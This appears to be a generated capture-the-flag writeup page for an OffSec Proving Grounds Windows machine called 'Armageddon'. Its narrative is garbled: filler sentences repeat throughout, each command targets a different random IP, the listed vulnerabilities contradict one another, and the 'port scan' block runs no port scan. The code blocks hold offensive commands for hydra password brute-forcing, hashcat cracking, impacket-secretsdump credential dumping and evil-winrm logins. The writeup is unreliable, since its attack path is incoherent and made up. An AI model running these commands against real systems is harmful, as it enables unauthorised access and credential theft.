---
TitleSEO: "OffSec Proving Grounds — Armageddon (Hard Windows) | ZureFX"
TitlePost: "OffSec Proving Grounds — Armageddon (Hard Windows)"
Author: "ZureFX"
Description: "Full writeup for OffSec Proving Grounds Armageddon. NFS No Root Squash and Local File Inclusion to achieve hard compromise on Windows."
Keywords: "pwntilldawn, web, windows, hard, easy, forensics"
URL: "https://zurefx.github.io/writeups/htb-armageddon-266.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-armageddon-266/"
Date: "2025-06-17"
Tags: "PwnTillDawn, Web, Windows, Hard, Easy, Forensics"
Section: "writeups"
Lang: "en"
main_img: "htb-armageddon-266"
Permalink: "/writeups/htb-armageddon-266.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Armageddon** is rated **Hard** on OffSec Proving Grounds. It runs **Windows** and the IP address during this analysis was `10.104.16.72`.

### Objectives

The service was running without proper input validation, leading to injection vulnerabilities. The service was running without proper input validation, leading to injection vulnerabilities.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.91.186.179 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
crackmapexec smb 10.91.70.120 -u administrator -p 'P@ssw0rd!' --shares
evil-winrm -i 10.28.20.148 -u administrator -p 'P@ssw0rd!'
```

The service was running without proper input validation, leading to injection vulnerabilities. Initial enumeration revealed several interesting open ports on the target.

### Service Enumeration

Post-exploitation enumeration revealed a path to domain administrator privileges. The web application was vulnerable to Server-Side Template Injection (SSTI). Unconstrained delegation was enabled on the compromised machine.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.29.175.24
crackmapexec smb 10.26.227.64 -u administrator -p 'P@ssw0rd!' --shares
```

The service was running without proper input validation, leading to injection vulnerabilities. Authentication bypass was achieved through careful manipulation of the login mechanism.

### Web Enumeration

Network traffic analysis revealed unencrypted communications containing user credentials. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.123.243.253
nmap -sCV -p636,8080,8080 10.83.158.96 -oN scan.txt
feroxbuster -h
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.103.113.199 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The target system was identified as running a vulnerable version of the service. The service was running without proper input validation, leading to injection vulnerabilities. The web application was vulnerable to Server-Side Template Injection (SSTI).

## Exploitation

### Vulnerability Identification

Network traffic analysis revealed unencrypted communications containing user credentials. Lateral movement was facilitated by reusing discovered credentials across services. The kernel version was outdated and vulnerable to a publicly known exploit.

Key finding: **NFS No Root Squash**.

The target system was identified as running a vulnerable version of the service. The database credentials were hardcoded in the application source code.

### Initial Access

Unconstrained delegation was enabled on the compromised machine. The database credentials were hardcoded in the application source code.

```bash
evil-winrm -i 10.36.236.238 -u administrator -p 'P@ssw0rd!'
nmap -sCV -p1433,389,389 10.104.158.116 -oN scan.txt
gobuster dir -u http://10.51.135.228/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
gobuster dir -u http://10.72.173.59/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Command injection was possible through unsanitized user input in the search functionality. Group Policy Preferences contained encrypted but recoverable credentials. Group Policy Preferences contained encrypted but recoverable credentials.

## Privilege Escalation

### Enumeration

Command injection was possible through unsanitized user input in the search functionality. Token impersonation allowed elevation to SYSTEM privileges on the target. The backup files contained sensitive information that should not have been accessible.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.113.230.169
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

### Exploitation

The service account had excessive permissions assigned in Active Directory. Weak file permissions allowed modification of critical system files.

```powershell
nmap -sCV -p23,443,5985 10.72.216.58 -oN scan.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
feroxbuster -h
```

Unconstrained delegation was enabled on the compromised machine. The service account had excessive permissions assigned in Active Directory.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Authentication bypass was achieved through careful manipulation of the login mechanism. Token impersonation allowed elevation to SYSTEM privileges on the target.

## Summary

### Tools Used

- `lookupsid`
- `metasploit`
- `impacket`
- `feroxbuster`
- `hashcat`

### Key Takeaways

- NFS No Root Squash
- Local File Inclusion
- LAPS Abuse
- CORS Misconfiguration
